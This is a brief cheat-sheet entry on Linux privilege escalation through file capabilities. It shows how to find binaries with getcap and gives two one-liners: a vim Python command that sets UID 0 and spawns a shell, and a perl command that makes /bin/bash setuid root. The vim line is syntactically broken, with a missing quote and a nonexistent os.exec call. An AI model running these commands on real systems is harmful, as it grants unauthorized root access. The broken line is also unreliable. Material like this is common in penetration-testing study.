# Example

### getcap -r / 2>/dev/null

## True Positive: cap_setuid+ep, cap_fowner+ep (This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file)

## Example:

### ./vim -c ':py3 import os; os.setuid(0); os.exec("/bin/sh, "sh", "-c", "reset; exec sh")' (cap_setuid+ep)

### ./perl -e 'chmod 04777, "/bin/bash";' (cap_fowner+ep)


